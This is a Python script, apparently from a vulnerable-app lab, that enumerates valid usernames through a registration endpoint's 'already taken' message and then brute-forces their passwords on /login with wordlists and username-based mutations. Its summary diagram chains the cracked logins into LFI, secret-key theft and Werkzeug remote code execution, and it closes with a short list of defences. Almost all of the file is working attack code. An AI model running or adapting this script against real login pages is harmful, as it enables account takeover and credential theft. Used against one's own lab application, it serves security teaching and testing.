#!/usr/bin/env python3
"""
Username Enumeration + Brute Force -- Credential Theft
=======================================================

this script starts from zero knowledge -- no usernames, no passwords, nothing
it discovers valid accounts and cracks their passwords using only wordlists

two-phase attack:
  phase 1: send common usernames to /register and check the response
           if the app says "already taken" we know that user exists
           this is called username enumeration and it is an info disclosure bug
           the secure version says "Registration failed" regardless

  phase 2: for each discovered username, try every password in the wordlist
           plus smart mutations (username123, Username!, etc)
           no rate limiting means we can try hundreds per second

the app has no protection against either phase:
  - no CAPTCHA
  - no account lockout
  - no rate limiting
  - no generic error messages on register

usage:
    python3 scripts/brute_force.py
    python3 scripts/brute_force.py --target http://127.0.0.1:5000
    python3 scripts/brute_force.py --userlist custom_users.txt --passlist custom_pass.txt
"""

import argparse
import os
import sys
import time

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"

# resolve wordlist paths relative to this script's location
# so the script works no matter which directory you run it from
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(SCRIPT_DIR)
DEFAULT_USERLIST = os.path.join(PROJECT_DIR, "wordlists", "usernames.txt")
DEFAULT_PASSLIST = os.path.join(PROJECT_DIR, "wordlists", "passwords.txt")


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"   # red
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    CN = "\033[96m"  # cyan
    B = "\033[1m"    # bold
    D = "\033[2m"    # dim
    X = "\033[0m"    # reset

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")


def load_wordlist(filepath, label):
    """reads a wordlist file and returns unique non-empty lines
    we deduplicate while preserving order because the wordlist
    might be sorted by frequency (most common passwords first)
    and we want to try those first"""
    if not os.path.isfile(filepath):
        fail(f"{label} not found: {filepath}")
        sys.exit(1)

    with open(filepath, "r") as f:
        words = [line.strip() for line in f if line.strip()]

    # remove duplicates but keep the original order
    # a set lookup is O(1) so this is efficient even for large lists
    seen = set()
    unique = []
    for w in words:
        if w not in seen:
            seen.add(w)
            unique.append(w)

    info(f"{label}: {filepath}")
    info(f"  Loaded {len(unique)} unique entries")
    return unique


def generate_mutations(username):
    """creates password guesses based on the username itself
    
    people love using their own name as a password with minor variations
    studies show roughly 4% of users have passwords containing their username
    so we always try these FIRST before the generic wordlist
    
    examples for username 'admin':
      admin, admin1, admin123, admin!, Admin, Admin123, ADMIN, adminadmin, nimda"""
    mutations = [
        username,                    # raw username as password
        username + "1",              # most common suffix
        username + "12",
        username + "123",            # the classic
        username + "1234",
        username + "!",              # "but i added a special character!"
        username + "!!",
        username + "@123",
        username + "#1",
        username.capitalize(),       # Admin
        username.capitalize() + "123",  # Admin123
        username.capitalize() + "!",    # Admin!
        username.upper(),            # ADMIN
        username + username,         # adminadmin (repeated)
        username[::-1],              # nimda (reversed)
    ]
    return mutations


# ──────────────────────────────────────────────
# phase 1 -- username enumeration via /register
#
# the vulnerability: when you try to register a username that already exists
# the app says "Username already taken" -- this confirms the account exists
# a secure app would say "Registration failed" regardless of the reason
#
# we loop through the entire username wordlist and collect confirmed users
# ──────────────────────────────────────────────

def phase1_enumerate(target, usernames):
    banner("PHASE 1 -- Username Enumeration via /register")
    info(f"Testing {len(usernames)} usernames...")
    info(f"Method: 'Username already taken' = confirmed user\n")

    found = []
    registered_side_effect = []  # usernames we accidentally created
    tested = 0
    start = time.time()

    for username in usernames:
        tested += 1

        # show progress every 10 usernames so the user knows it is working
        if tested % 10 == 0:
            print(f"  {C.D}    ... {tested}/{len(usernames)} tested{C.X}", end="\r")

        try:
            # we try to register each username with a random password
            # we dont actually want to create accounts -- we just want the error message
            resp = requests.post(f"{target}/register", data={
                "username": username,
                "password": "enum_probe_xK9mQ2",  # random password nobody would guess
                "confirm":  "enum_probe_xK9mQ2",
            }, allow_redirects=False, timeout=5)

            # 200 with "already taken" means the username exists in the database
            if resp.status_code == 200 and "already taken" in resp.text.lower():
                ok(f"{C.G}{username}{C.X}")
                found.append(username)
            elif resp.status_code == 302:
                # 302 redirect means registration succeeded -- we accidentally created an account
                # this is a side effect but it also proves there is no rate limiting on register
                registered_side_effect.append(username)

        except requests.exceptions.ConnectionError:
            fail(f"Connection lost at attempt {tested}")
            break

    elapsed = time.time() - start
    rate = tested / elapsed if elapsed > 0 else 0

    # overwrite the progress line with blank space
    print(f"  {' ' * 50}")
    print(f"  {'─' * 50}")
    info(f"Scanned: {tested} usernames in {elapsed:.1f}s ({rate:.0f} req/s)")
    ok(f"Found: {C.G}{len(found)} valid usernames{C.X}")

    # warn about side effects -- we created accounts we didn't mean to
    # this also demonstrates that there is no email verification or CAPTCHA
    if registered_side_effect:
        warn(f"Side effect: {len(registered_side_effect)} new accounts created")
        warn("(No email verification = mass registration possible)")

    if found:
        print()
        info("Confirmed users:")
        for u in found:
            print(f"       - {C.Y}{u}{C.X}")

    return found


# ──────────────────────────────────────────────
# phase 2 -- password brute force via /login
#
# for each confirmed username from phase 1, we try every password
# mutations go first because they are most likely to hit
# then the generic wordlist follows
#
# the vulnerability: no rate limiting, no lockout, no CAPTCHA
# we can try hundreds of passwords per second per account
# ──────────────────────────────────────────────

def phase2_bruteforce(target, usernames, base_passwords):
    banner("PHASE 2 -- Password Brute Force via /login")
    info(f"Targets: {len(usernames)} confirmed users")
    info(f"Base wordlist: {len(base_passwords)} passwords")
    info(f"+ per-user mutations (username123, Username!, etc.)\n")

    cracked = []
    total_attempts = 0
    start = time.time()

    for username in usernames:
        # generate username-specific mutations and put them at the front of the list
        # because people tend to use their own name in their password
        mutations = generate_mutations(username)

        # merge mutations + base wordlist, removing duplicates
        # mutations go first because they are more likely to succeed
        seen = set()
        password_list = []
        for p in mutations + base_passwords:
            if p not in seen:
                seen.add(p)
                password_list.append(p)

        info(f"Attacking '{C.Y}{username}{C.X}' -- {len(password_list)} passwords to try")

        user_attempts = 0
        user_start = time.time()
        found = False

        for password in password_list:
            total_attempts += 1
            user_attempts += 1

            try:
                resp = requests.post(f"{target}/login", data={
                    "username": username,
                    "password": password,
                }, allow_redirects=False, timeout=5)

                # 302 = successful login (server redirects to welcome page)
                # 200 = failed login (server re-renders login page with error)
                if resp.status_code == 302:
                    user_elapsed = time.time() - user_start
                    ok(f"{C.G}CRACKED{C.X}  ->  {C.Y}{username}{C.X}:{C.R}{password}{C.X}")
                    ok(f"  Found after {user_attempts} attempts ({user_elapsed:.1f}s)")
                    cracked.append((username, password, user_attempts))
                    found = True

                    # log out so we dont leave sessions hanging around
                    try:
                        requests.get(f"{target}/logout", cookies=resp.cookies, timeout=3)
                    except:
                        pass
                    break  # move on to the next username

            except requests.exceptions.ConnectionError:
                fail("Connection lost")
                return cracked

            # show progress every 25 attempts
            if user_attempts % 25 == 0:
                print(f"  {C.D}    ... {user_attempts}/{len(password_list)} tried{C.X}", end="\r")

        if not found:
            print(f"  {C.D}    ... {user_attempts}/{len(password_list)} tried{C.X}")
            fail(f"Could not crack '{username}' (exhausted wordlist)")

        print()

    elapsed = time.time() - start
    rate = total_attempts / elapsed if elapsed > 0 else 0

    print(f"  {'─' * 50}")
    info(f"Total: {total_attempts} attempts in {elapsed:.1f}s ({rate:.0f} req/s)")
    ok(f"Cracked: {C.G}{len(cracked)}/{len(usernames)}{C.X} accounts")

    return cracked, rate


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary(found_users, cracked, rate, num_usernames, num_passwords):
    banner("ATTACK CHAIN SUMMARY")

    print(f"""
  {C.B}Attack stats:{C.X}
  +------------------------------------+
  |  Usernames tested   :  {num_usernames:<11d}|
  |  Users found        :  {len(found_users):<11d}|
  |  Passwords/user     :  ~{num_passwords:<10d}|
  |  Speed              :  {rate:.0f} req/s{' ' * max(0, 5-len(f'{rate:.0f}'))}|
  |  Accounts cracked   :  {len(cracked):<11d}|
  +------------------------------------+
""")

    if cracked:
        print(f"  {C.B}Cracked credentials:{C.X}\n")
        for username, password, attempts in cracked:
            print(f"    {C.Y}{username}{C.X}:{C.R}{password}{C.X}  (attempt #{attempts})")

    print(f"""
  {C.B}Attack chain:{C.X}

  +----------------------------------------------------------+
  |  WEAKNESS 1: Username leak in /register                  |
  |  "Username already taken" confirms valid accounts.       |
  |  {len(found_users)} users found from {num_usernames} guesses.{' ' * max(0, 28 - len(f'{len(found_users)} users found from {num_usernames} guesses.'))}|
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  WEAKNESS 2: No rate limiting on /login                  |
  |  {rate:.0f} requests/second -- no lockout, no CAPTCHA.{' ' * max(0, 17 - len(f'{rate:.0f}'))}|
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  WEAKNESS 3: Weak passwords                              |
  |  Common patterns (word+123) found in standard wordlists. |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  RESULT: Valid credentials obtained                      |
  |  -> Login -> LFI -> SECRET_KEY -> forge any session      |
  |  -> Login -> LFI -> PIN calc -> Werkzeug RCE             |
  |  -> {C.R}Full server compromise from zero knowledge{C.X}            |
  +----------------------------------------------------------+

  {C.Y}How to prevent:{C.X}

  - Generic register errors (don't confirm username existence)
  - Rate limit: Flask-Limiter, 5 attempts/minute
  - Account lockout after 5 failures
  - CAPTCHA after 3 failures
  - Strong password policy + breach database checks
  - Multi-factor authentication
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Username Enumeration + Brute Force Attack"
    )
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--userlist", default=DEFAULT_USERLIST,
                        help="Path to username wordlist")
    parser.add_argument("--passlist", default=DEFAULT_PASSLIST,
                        help="Path to password wordlist")
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{C.B}{C.R}
  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝
{C.X}
  {C.D}Enumerate Usernames -> Brute Force Passwords{C.X}
  {C.D}Target: {target}{C.X}
  {C.D}Zero prior knowledge -- wordlists only{C.X}
""")

    # load wordlists from disk
    banner("LOADING WORDLISTS")
    usernames = load_wordlist(args.userlist, "Usernames")
    passwords = load_wordlist(args.passlist, "Passwords")

    time.sleep(0.5)

    # phase 1: enumerate valid usernames via the register endpoint
    found_users = phase1_enumerate(target, usernames)

    if not found_users:
        fail("No valid usernames discovered")
        fail("Try a larger wordlist or different target")
        sys.exit(1)

    time.sleep(0.5)

    # phase 2: brute force passwords for each discovered user
    cracked, rate = phase2_bruteforce(target, found_users, passwords)

    # print final summary with attack chain diagram
    print_summary(found_users, cracked, rate, len(usernames), len(passwords))


if __name__ == "__main__":
    main()
